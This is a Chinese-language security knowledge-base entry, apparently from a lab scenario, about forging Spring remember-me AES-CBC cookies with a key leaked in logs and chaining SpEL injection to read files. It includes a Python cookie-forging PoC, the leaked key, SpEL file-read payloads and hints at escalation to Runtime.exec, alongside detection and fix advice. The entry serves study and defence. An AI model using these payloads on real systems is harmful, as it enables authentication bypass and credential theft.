---
id: web-java-framework-spring-rememberme-aes-cookie-spel-injection
title: Spring remember-me 无签名 AES-CBC Cookie 伪造 + welcome 接口 SpEL 求值读文件
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-rememberme-aes-cookie-spel-file-read
tags:
- java
- spring
- remember-me
- cookie
- aes-cbc
- session-forgery
- spel
- expression-injection
- file-read
- credential-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:14+08:00'
  notes: 对照小宝：world-readable 日志泄露 AES 密钥、base64url(AES-128-CBC) remember-me、welcome SpEL T() 读文件一致；未复跑
url: /docs/web/java/framework/spring/web-java-framework-spring-rememberme-aes-cookie-spel-injection/
draft: false
kb_aliases:
- Spring remember-me Cookie 伪造
- AES-128-CBC 无 MAC Cookie
- report-center remember-me
- welcome SpEL 注入
- T(java.nio.file.Files) 任意文件读
- 日志泄露会话密钥
---

## 一句话结论

Spring 应用的 remember-me Cookie 若只是 `base64url(AES-128-CBC-PKCS5(username))`、没有 MAC/过期时间，且密钥因日志可读而泄露，攻击者可伪造任意用户；当 `/api/v1/welcome` 又把 Cookie 中的用户名直接放进 SpEL 求值时，可用 `T(java.nio.file.Files).readString(...)` 读取任意文件并窃取下一跳凭据。

## 原理

- **Cookie 只加密不认证**：服务端把用户名用 AES-128-CBC/PKCS5 加密后 Base64URL 编码写入 remember-me Cookie，没有 HMAC/签名，也没有把签发时间或服务端会话 ID 纳入明文。AES-CBC 只提供机密性，不提供完整性；攻击者拿到密钥后可以对任意用户名重新加密，服务端无法区分“自己签发”与“攻击者伪造”。
- **密钥泄露**：`/var/log/xbw/report-center.log` 是 world-readable，日志中打印了 AES 会话密钥 `Xbw-R3m3mb3r-K3y`、IV 以及路由表信息。日志可读即等于 Cookie 签名能力泄露。
- **SpEL sink**：`/api/v1/welcome` 读取 Cookie 中的用户名后，把它拼进 SpEL 表达式求值。用 `#{7*7}` 返回 49 可确认求值；黑名单是正则匹配，但 `T()` 静态类型调用不在黑名单内，`T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/xbw/report.json'))` 即可读取任意文件。
- **链式价值**：读到的 `report.json` 中包含下一跳 sentinel 的 `sign_key`，用于伪造 sentinel 的请求签名，进而把文件读取升级为跨服务 RCE。即使没有下一跳，任意文件读也足以泄露配置、数据库口令和密钥。

## 触发条件

- Spring Security remember-me 使用对称加密但未加 MAC/签名，或使用了可预测/泄露的密钥；Cookie 内容仅包含用户名等低熵信息。
- Cookie 密钥、IV 通过日志、配置文件、源码或错误页泄露；日志权限过宽。
- 业务接口把 Cookie/请求中的用户名字段直接交给 SpEL、OGNL、模板引擎等表达式求值。
- SpEL 黑名单只做正则子串匹配，未禁用 `T()`、反射、`java.nio.file` 等。

## 利用步骤

1. 通过任意文件读、日志泄露或配置泄露取得 remember-me 的 AES 密钥与 IV。
2. 用密钥对目标用户名（如 `admin`）做 AES-128-CBC/PKCS5 加密，Base64URL 编码后写入 remember-me Cookie。
3. 访问受保护接口验证伪造身份；若服务端信任 Cookie 中的用户名，即完成认证绕过。
4. 访问 `/api/v1/welcome`，先提交 `#{7*7}` 确认 SpEL 求值，再提交 `#{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/xbw/report.json'))}` 读取文件。
5. 从读取到的配置中提取下一跳密钥（如 sentinel `sign_key`），继续横向或构造签名请求。

## PoC

```python
import base64, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

KEY = b"Xbw-R3m3mb3r-K3y"          # 从可读日志获得
IV  = bytes.fromhex("<log 中的 iv>")

def forge(username: str) -> str:
    ct = AES.new(KEY, AES.MODE_CBC, IV).encrypt(pad(username.encode(), 16))
    return base64.urlsafe_b64encode(ct).decode().rstrip("=")

cookies = {"remember-me": forge("admin")}
r = requests.get("http://target/api/v1/welcome", cookies=cookies)
print(r.text)
```

```text
# SpEL 探测与文件读取（放在用户名/Cookie 对应字段）
#{7*7}
#{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/xbw/report.json'))}
```

## 变体与关联

- 变体：Cookie 明文为 `username:expiry` 时可直接修改过期时间；若使用固定 IV，相同用户名密文可重放；密钥可从 `.git`、备份、Actuator env/heapdump 获取。
- 变体：SpEL 黑名单可被 `T()`、`getClass()`、反射、`ScriptEngine`、`URLClassLoader` 等绕过；文件读之外可进一步 `Runtime.exec`。
- 关联：[[web-generic-auth-myblog-hardcoded-aes-cookie-forgery]]（硬编码 AES 盐值 Cookie 伪造）、[[web-java-framework-shiro-721-padding-oracle]]（AES-CBC rememberMe 的 padding oracle）、[[web-java-expression-spel-injection-to-rce]]（SpEL 注入到 RCE）。
- 边界：若 remember-me 使用 Spring Security 默认的 `TokenBasedRememberMeServices`（HMAC）或密钥足够随机且不泄露，则不能伪造；SpEL 若使用 `SimpleEvaluationContext` 或禁用 `T()`，文件读失效。

## 检测与防御

- 检测：remember-me Cookie 长度固定、Base64URL 且不含 `.` 分隔的签名段；日志中出现 `key`/`iv`/`remember` 等字段；`/welcome` 等接口对 `#{`、`T(`、`java.nio.file` 的请求；同一 Cookie 对应多个用户名或异常地理位置。
- 修复：使用带 HMAC 的 remember-me（Spring Security 默认的 token 签名）或服务端会话；密钥从 KMS/环境变量注入并定期轮换；日志脱敏，禁止打印密钥/IV。
- 加固：不要对用户输入做 SpEL 求值，使用 `SimpleEvaluationContext` 并禁用类型引用/方法调用；对文件读取接口做路径白名单；日志目录最小权限；Cookie 加 `HttpOnly/Secure/SameSite`。
